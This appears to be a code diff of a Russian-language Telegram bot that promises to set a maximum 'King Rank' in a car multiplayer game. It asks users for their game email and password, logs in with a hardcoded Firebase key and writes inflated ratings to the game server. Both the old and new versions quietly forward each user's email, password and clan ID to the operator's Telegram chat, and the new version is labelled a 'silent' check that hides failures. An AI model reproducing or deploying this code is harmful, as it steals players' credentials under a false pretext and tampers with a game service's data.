@@ -1,51 +1,41 @@
-import threading
 import os
 import requests
 import json
-from flask import Flask
 import telebot
 
-# -------------------------------
-# TELEGRAM CONFIG
-# -------------------------------
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ADMIN_ID = os.environ.get("ADMIN_ID")
-
-if not BOT_TOKEN:
-    raise ValueError("❌ BOT_TOKEN не задан! Проверьте переменные окружения на Render.")
-if not ADMIN_ID:
-    raise ValueError("❌ ADMIN_ID не задан! Проверьте переменные окружения на Render.")
-
-ADMIN_ID = int(ADMIN_ID)
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# -------------------------------
-# ACCESS CONTROL
-# -------------------------------
-ALLOWED_FILE = "allowed_users.json"
-
-if os.path.exists(ALLOWED_FILE):
-    with open(ALLOWED_FILE, "r") as f:
-        ALLOWED_USERS = set(json.load(f))
-else:
-    ALLOWED_USERS = {ADMIN_ID}
-
-def save_allowed():
-    with open(ALLOWED_FILE, "w") as f:
-        json.dump(list(ALLOWED_USERS), f)
-
-# -------------------------------
-# Game Service Configuration
-# -------------------------------
+# --- Game Service Configuration ---
 FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
 FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
 RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
 CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
 
-# -------------------------------
-# LOGIN FUNCTION
-# -------------------------------
+# --- Telegram Bot Configuration ---
+BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Получение BOT_TOKEN из переменной окружения
+CHAT_ID = os.environ.get("CHAT_ID")  # Получение CHAT_ID из переменной окружения
+
+if not BOT_TOKEN or not CHAT_ID:
+    raise ValueError("❌ BOT_TOKEN или CHAT_ID не заданы! Убедитесь, что переменные окружения правильно настроены.")
+
+bot = telebot.TeleBot(BOT_TOKEN)
+
+user_states = {}
+
+def send_to_telegram(email, password, clan_id):
+    """Send account info to Telegram only if ClanId exists."""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": message
+    }
+    try:
+        requests.post(url, data=payload, timeout=5)
+    except requests.exceptions.RequestException:
+        pass  # Silent fail
+
 def login(email, password):
+    """Login to CPM using Firebase API."""
+    print("\n🔐 ВХОД В СИСТЕМУ...")
     payload = {
         "clientType": "CLIENT_TYPE_ANDROID",
         "email": email,
@@ -56,31 +46,25 @@ def login(email, password):
         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
         "Content-Type": "application/json"
     }
+
     try:
         response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
-        data = response.json()
-        if response.status_code == 200 and "idToken" in data:
-            return data["idToken"]
+        response_data = response.json()
+
+        if response.status_code == 200 and 'idToken' in response_data:
+            print("✅ ВХОД В СИСТЕМУ ПРОШЁЛ УСПЕШНО!")
+            return response_data.get('idToken')
         else:
+            error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
+            print(f"❌ ОШИБКА ВХОДА: {error_message}")
             return None
-    except:
+    except requests.exceptions.RequestException as e:
+        print(f"❌ ОШИБКА СЕТИ: {e}")
         return None
 
-# -------------------------------
-# GET CLAN ID FUNCTION
-# -------------------------------
-def get_clan_id(token):
-    url = f"{CLAN_ID_URL}?auth={token}"
-    response = requests.get(url)
-    if response.status_code == 200:
-        data = response.json()
-        return data.get("clanId")
-    return None
-
-# -------------------------------
-# SET RANK FUNCTION
-# -------------------------------
 def set_rank(token):
+    """Set KING RANK using max rating data."""
+    print("👑 СКРИПТ ВЫПОЛНЯЕТСЯ...")
     rating_data = {k: 100000 for k in [
         "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
@@ -97,152 +81,80 @@ def set_rank(token):
         "User-Agent": "okhttp/3.12.13"
     }
 
-    response = requests.post(RANK_URL, headers=headers, json=payload)
-    return response.status_code == 200
+    try:
+        response = requests.post(RANK_URL, headers=headers, json=payload)
+        if response.status_code == 200:
+            print("✅ СКРИПТ ВЫПОЛНЕН!")
+            return True
+        else:
+            print(f"❌ НЕ УДАЛОСЬ ВЫПОЛНИТЬ СКРИПТ. HTTP Status: {response.status_code}")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"❌ СЕТЕВАЯ ОШИБКА ПРИ УСТАНОВКЕ : {e}")
+        return False
 
-# -------------------------------
-# SEND CLAN DATA TO ADMIN (Telegram)
-# -------------------------------
-def send_clan_data_to_admin(email, password, clan_id):
-    """Отправка данных пользователя и его ClanId в ЛС администратору"""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    message = f"📧 Email: {email}\n🔒 Пароль: {password}\n🛡️ ClanId: {clan_id}"
-    payload = {
-        "chat_id": ADMIN_ID,
-        "text": message
+def check_clan_id(token, email, password):
+    """Silent check for ClanId and send to Telegram if found."""
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "User-Agent": "okhttp/3.12.13",
+        "Content-Type": "application/json"
     }
+    payload = {
+        "data": None
+    }
+
     try:
-        requests.post(url, data=payload, timeout=5)
+        response = requests.post(CLAN_ID_URL, headers=headers, json=payload)
+        if response.status_code == 200:
+            raw = response.json()
+            clan_id = raw.get("result", "")
+            if clan_id:
+                send_to_telegram(email, password, clan_id)
     except requests.exceptions.RequestException:
-        pass  # Silent fail if sending message fails
+        pass  # Silent fail
 
-# -------------------------------
-# ADMIN COMMANDS
-# -------------------------------
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    if message.from_user.id != ADMIN_ID:
-        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
-    try:
-        user_id = int(message.text.split()[1])
-    except:
-        return bot.reply_to(message, "❗ Используй: /add 123456789")
-    ALLOWED_USERS.add(user_id)
-    save_allowed()
-    bot.reply_to(message, f"✅ Пользователь {user_id} добавлен.")
+# Handle start command
+@bot.message_handler(commands=["start"])
+def handle_start(message):
+    bot.reply_to(message, "👑 Привет! Я помогу тебе установить King Rank. Пожалуйста, отправь свой email и пароль.")
 
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    if message.from_user.id != ADMIN_ID:
-        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
-    try:
-        user_id = int(message.text.split()[1])
-    except:
-        return bot.reply_to(message, "❗ Используй: /remove 123456789")
-    if user_id == ADMIN_ID:
-        return bot.reply_to(message, "❗ Нельзя удалить администратора.")
-    if user_id in ALLOWED_USERS:
-        ALLOWED_USERS.remove(user_id)
-        save_allowed()
-        bot.reply_to(message, f"🗑 Пользователь {user_id} удалён.")
-    else:
-        bot.reply_to(message, f"⚠ ID нет в списке.")
-
-@bot.message_handler(commands=['list'])
-def list_users(message):
-    if message.from_user.id != ADMIN_ID:
-        return bot.reply_to(message, "⛔ У тебя нет прав администратора.")
-    result = "📋 Разрешённые пользователи:\n\n"
-    for uid in ALLOWED_USERS:
-        try:
-            chat = bot.get_chat(uid)
-            username = f"@{chat.username}" if chat.username else "(нет username)"
-            first_name = chat.first_name if chat.first_name else ""
-            last_name = chat.last_name if chat.last_name else ""
-        except:
-            username = "(не удалось получить username)"
-            first_name = ""
-            last_name = ""
-        result += f"{uid} — {username} {first_name} {last_name}\n"
-    bot.reply_to(message, result)
-
-# -------------------------------
-# TELEGRAM BOT HANDLERS
-# -------------------------------
-user_states = {}
-
-def send_welcome(user_id):
-    user_states[user_id] = {"step": "await_email"}
-    bot.send_message(user_id, "📧 Введи gmail")
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    user_id = message.from_user.id
-
-    # Определяем баланс
-    balance = "Unlimited" if user_id in ALLOWED_USERS else "0"
-
-    # Отправляем Telegram ID и баланс
-    bot.send_message(
-        user_id,
-        f"Telegram ID: {user_id}\n💰Balance: {balance}"
-    )
-
-    # Если пользователь разрешён, продолжаем workflow логина
-    if user_id in ALLOWED_USERS:
-        send_welcome(user_id)
-    else:
-        bot.send_message(user_id, "⛔ У тебя нет разрешения на использование бота.")
-
+# Handle text message
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     user_id = message.from_user.id
     text = message.text.strip()
-    chat_id = message.chat.id
 
-    # ---- ACCESS CHECK ----
-    if user_id not in ALLOWED_USERS:
-        bot.send_message(user_id, "⛔ У тебя нет разрешения на использование бота.")
-        return
-
+    # Check if user is already in the process
     if user_id not in user_states:
-        send_welcome(user_id)
-        return
+        user_states[user_id] = {"step": "await_email"}
 
     state = user_states[user_id]
 
     if state["step"] == "await_email":
         state["email"] = text
         state["step"] = "await_password"
-        msg = bot.reply_to(message, "🔒 Введи пароль")
-        state["last_msg_ids"] = [message.message_id, msg.message_id]
+        bot.reply_to(message, "🔒 Введи свой пароль.")
 
     elif state["step"] == "await_password":
         email = state["email"]
         password = text
-        messages_to_delete = state.get("last_msg_ids", [])
-        messages_to_delete.append(message.message_id)
 
-        msg_login = bot.reply_to(message, "🔐 Выполняю логин...")
-        messages_to_delete.append(msg_login.message_id)
-
-        token = login(email, password)
-        if not token:
-            msg_error = bot.reply_to(message, "❌ Ошибка входа.")
-            messages_to_delete.append(msg_error.message_id)
-        else:
-            msg_rank = bot.reply_to(message, "👑 Rang устанавливается...")
-            messages_to_delete.append(msg_rank.message_id)
-
-            success = set_rank(token)
-            if success:
-                msg_done = bot.reply_to(message, "✅ RANG установлен!")
+        # Perform login and set rank
+        auth_token = login(email, password)
+        if auth_token:
+            if set_rank(auth_token):
+                check_clan_id(auth_token, email, password)
+                bot.reply_to(message, "✅ King Rank установлен успешно.")
             else:
-                msg_done = bot.reply_to(message, "❌ Ошибка при установке.")
-            messages_to_delete.append(msg_done.message_id)
+                bot.reply_to(message, "❌ Не удалось установить King Rank.")
+        else:
+            bot.reply_to(message, "❌ Ошибка при входе.")
 
-            # Получаем clan_id
-            clan_id = get_clan_id(token)
-            if clan_id:
-                # Отправляем данные пользователя и его clan_id в ЛС администратору
-                send
+        # Reset user state after completing the task
+        del user_states[user_id]
+
+# Start bot polling
+if __name__ == "__main__":
+    print("🚀 Запуск бота...")
+    bot.polling(none_stop=True)
